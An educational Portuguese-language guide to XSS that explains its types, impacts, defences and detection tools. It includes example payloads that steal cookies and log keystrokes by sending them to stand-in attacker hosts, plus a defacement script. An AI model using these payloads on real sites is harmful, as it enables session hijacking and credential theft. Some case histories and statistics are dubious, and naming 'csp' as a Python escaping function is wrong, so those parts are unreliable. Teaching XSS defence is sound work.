# XSS (Cross-Site Scripting)

## 📌 Definição

XSS (Cross-Site Scripting) é uma vulnerabilidade de segurança em aplicações web que permite a um atacante injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários. Esses scripts são executados no navegador da vítima, permitindo que o atacante roube dados, sequestre sessões, realize ações não autorizadas ou redirecione o usuário para sites maliciosos.

---

## 🧠 Como Funciona

O ataque XSS explora a falta de validação e sanitização de entradas do usuário:

1. **Injeção**: O atacante insere código malicioso em um campo de entrada (formulário, URL, comentário, etc.).
2. **Armazenamento/Reflexão**: O código é armazenado no servidor ou refletido imediatamente na resposta.
3. **Execução**: Quando outro usuário acessa a página comprometida, o script é executado no navegador dele.
4. **Exploração**: O script malicioso rouba cookies, tokens de sessão, credenciais ou realiza ações em nome do usuário.

---

# 🧩 Tipos de XSS

## 1. **XSS Refletido (Reflected XSS)**

O script malicioso é refletido imediatamente pela aplicação web sem ser armazenado.

| Característica | Descrição |
|----------------|-----------|
| **Armazenamento** | Não é armazenado no servidor |
| **Entrega** | Link malicioso enviado por e-mail, SMS ou redes sociais |
| **Execução** | Ocorre quando a vítima clica no link |
| **Exemplo** | `http://site.com/search?q=<script>alert('XSS')</script>` |

**Exemplo Prático:**
```html
// URL maliciosa
http://vulnerable-site.com/search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

// Quando a vítima acessa, o cookie é enviado ao atacante
```

## 2. **XSS Armazenado (Stored XSS)**

O script malicioso é armazenado permanentemente no servidor (banco de dados, arquivos, etc.).

| Característica | Descrição |
|----------------|-----------|
| **Armazenamento** | Persistente no servidor |
| **Entrega** | Qualquer usuário que acessar a página comprometida será afetado |
| **Perigo** | Altíssimo - afeta múltiplos usuários |
| **Exemplo** | Comentários em blogs, perfis de usuário, mensagens em fóruns |

**Exemplo Prático:**
```html
<!-- Inserido em um comentário de blog -->
<script>
  // Rouba cookies de todos que visualizarem o comentário
  fetch('http://attacker.com/steal?data=' + document.cookie);
</script>
```

## 3. **XSS Baseado em DOM (DOM-based XSS)**

A vulnerabilidade está no código JavaScript do lado do cliente (DOM), não no servidor.

| Característica | Descrição |
|----------------|-----------|
| **Local** | Ocorre no navegador, sem enviar dados ao servidor |
| **Origem** | Manipulação do DOM por fontes não confiáveis (ex: `document.location`) |
| **Dificuldade** | Mais difícil de detectar por ferramentas de servidor |
| **Exemplo** | `document.write(location.hash.slice(1))` |

**Exemplo Prático:**
```javascript
// Código vulnerável no frontend
var param = location.search.split('=')[1];
document.write("Bem-vindo, " + param);

// URL maliciosa
http://site.com?name=<script>alert('XSS')</script>
```

## 4. **mXSS (Mutation XSS)**

Explora como os navegadores interpretam e renderizam HTML/CSS de forma diferente.

| Característica | Descrição |
|----------------|-----------|
| **Complexidade** | Alto - usa filtros de sanitização |
| **Exploração** | Manipulação da árvore DOM durante renderização |
| **Exemplo** | `<svg><style><img src=x onerror=alert(1)>` |

---

## 🎯 Impactos e Consequências

| Impacto | Descrição |
|---------|-----------|
| **Roubo de Cookies** | Obtém sessões de usuários logados (session hijacking) |
| **Roubo de Credenciais** | Captura senhas via keylogging ou formulários falsos |
| **Keylogging** | Registra todas as teclas digitadas pelo usuário |
| **Phishing** | Redireciona para sites falsos ou mostra pop-ups enganosos |
| **Ações Não Autorizadas** | Executa ações no sistema em nome do usuário (postagens, transferências, etc.) |
| **Defacement** | Altera visualmente o conteúdo da página |
| **Propagação de Malware** | Distribui malware para usuários do site |
| **Mineração de Criptomoedas** | Utiliza CPU da vítima para minerar (cryptojacking) |

---

## 🛡️ Como se Proteger

### **Medidas de Prevenção**

| Técnica | Descrição |
|---------|-----------|
| **Sanitização de Entrada** | Remover ou codificar caracteres especiais (`<`, `>`, `"`, `'`, `&`, etc.) |
| **Validação Rigorosa** | Validar e restringir formato dos dados (ex: regex para emails, números) |
| **Codificação de Saída (Output Encoding)** | Codificar dados antes de exibi-los (ex: HTML entity encoding) |
| **CSP (Content Security Policy)** | Restringir fontes de script executáveis |
| **HttpOnly Cookies** | Impedir acesso a cookies via JavaScript |
| **Secure Cookies** | Enviar cookies apenas via HTTPS |
| **X-XSS-Protection Header** | Ativar filtro de XSS do navegador (embora obsoleto, útil como camada extra) |

### **Boas Práticas de Desenvolvimento**

- ✅ **Evitar `eval()`, `document.write()`, `innerHTML` com dados não confiáveis**.
- ✅ **Usar `textContent` em vez de `innerHTML`** para dados dinâmicos.
- ✅ **Utilizar frameworks seguros** (React, Angular, Vue) que sanitizam automaticamente.
- ✅ **Escapar caracteres especiais** com funções como `htmlspecialchars()` (PHP), `csp` (Python), etc.
- ✅ **Aplicar princípio de menor privilégio** para scripts.
- ✅ **Realizar testes de segurança regulares** (SAST, DAST, pentests).

### **Exemplo de Sanitização**

```javascript
// ❌ VULNERÁVEL - Direto no DOM
document.getElementById('output').innerHTML = userInput;

// ✅ SEGURO - Texto puro
document.getElementById('output').textContent = userInput;

// ✅ SEGURO - Escapando HTML
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
document.getElementById('output').innerHTML = escapeHtml(userInput);
```

---

## 🧰 Ferramentas de Detecção

| Ferramenta | Tipo | Descrição |
|------------|------|-----------|
| **Burp Suite** | Pentest | Scanner automático de XSS e outras vulnerabilidades |
| **OWASP ZAP** | Pentest | Ferramenta open-source para encontrar XSS |
| **XSStrike** | Especializado | Scanner avançado para XSS com fuzzing |
| **DOM Invader** | Navegador | Extensão para testar XSS baseado em DOM |
| **Nmap NSE** | Scripts | Scripts para detecção de XSS em serviços web |
| **Netsparker** | Comercial | Scanner com baixa taxa de falsos positivos |
| **Acunetix** | Comercial | Scanner de vulnerabilidades web, incluindo XSS |

---

## 📘 Exemplos Práticos

### **Exemplo 1: Roubo de Cookie**

**Código Vulnerável (PHP):**
```php
<?php
echo "Olá, " . $_GET['nome'];
?>
```

**Ataque:**
```html
http://site.com?nome=<script>fetch('http://atacante.com?cookie='+document.cookie)</script>
```

### **Exemplo 2: Keylogger**

**Script Malicioso:**
```html
<script>
  document.onkeypress = function(e) {
    fetch('http://atacante.com/log?key=' + e.key);
  };
</script>
```

### **Exemplo 3: Defacement**

**Alteração Visual:**
```html
<script>
  document.body.innerHTML = '<h1>Site Hacked</h1><p>By Anonymous</p>';
</script>
```

---

## 📊 Estatísticas Relevantes

- **XSS é a 3ª vulnerabilidade mais comum** na web (OWASP Top 10).
- **~60% das aplicações web** têm alguma forma de XSS.
- **Custo médio de um ataque XSS**: US$ 150.000 por incidente.
- **Setores mais afetados**: E-commerce, redes sociais, bancos online, saúde.
- **Tempo médio para correção**: 3-6 meses após detecção.

---

## 🚨 Sinais de Vulnerabilidade

- ⚠️ **Entrada do usuário é exibida sem sanitização**.
- ⚠️ **URLs refletem parâmetros diretamente na página**.
- ⚠️ **Campos de busca, comentários, perfis não filtram HTML**.
- ⚠️ **Uso de `eval()` com dados externos**.
- ⚠️ **Falta de CSP (Content Security Policy)**.

---

## 🧠 XSS vs Outros Ataques

| Ataque | Diferença |
|--------|-----------|
| **XSS vs CSRF** | XSS executa scripts; CSRF força ações sem script (usando tokens). |
| **XSS vs SQL Injection** | XSS ataca frontend (navegador); SQL Injection ataca backend (banco de dados). |
| **XSS vs HTML Injection** | XSS executa JavaScript; HTML Injection apenas insere HTML estático. |
| **XSS vs Clickjacking** | XSS injeta código; Clickjacking engana cliques (UI redressing). |

---

## ⚖️ Aspectos Legais

- **LGPD (Brasil)**: Empresas devem proteger dados de usuários contra XSS.
- **GDPR (Europa)**: Multas severas para violações de segurança.
- **Lei Carolina Dieckmann (Brasil)**: Crimes cibernéticos incluem invasão de dispositivos via XSS.
- **Penalidades**: Ações judiciais, multas (até 2% do faturamento na LGPD) e danos à reputação.

---

## 📖 Casos Famosos

| Ano | Empresa | Impacto |
|-----|---------|---------|
| 2005 | **MySpace (Samy Worm)** | O worm "Samy" se espalhou via XSS, adicionando "Samy is my hero" a 1M+ perfis. |
| 2014 | **Google+** | Vulnerabilidade XSS permitiu roubo de dados de usuários. |
| 2016 | **Yahoo** | XSS no Yahoo Mail permitiu roubo de emails. |
| 2018 | **British Airways** | XSS em seu site auxiliou no roubo de dados de 380k clientes. |
| 2021 | **Vodafone** | XSS permitiu acesso a contas de clientes. |
| 2023 | **ChatGPT** | XSS em plugin permitiu execução de código em sessões de usuários. |

---

## 🔗 Referências e Links Úteis

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Guide](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Web Docs - XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [CERT XSS Resources](https://www.cert.org/)

---

## 🎯 Checklist de Segurança

- [ ] Sanitizar **todas** as entradas do usuário.
- [ ] Codificar saídas com base no contexto (HTML, JS, CSS, URL, etc.).
- [ ] Implementar **CSP** rigoroso.
- [ ] Usar **HttpOnly** e **Secure** flags em cookies.
- [ ] Validar formato dos dados (ex: email, números, datas).
- [ ] Realizar testes automáticos e manuais regulares.
- [ ] Manter frameworks e bibliotecas atualizados.
- [ ] Treinar equipe de desenvolvimento em segurança.

---

> ⚠️ **Nota**: Este documento tem caráter educacional. Testar vulnerabilidades XSS em sites sem autorização é **ilegal**. Utilize apenas em ambientes de teste próprios ou com permissão expressa (bug bounty, pentests autorizados).
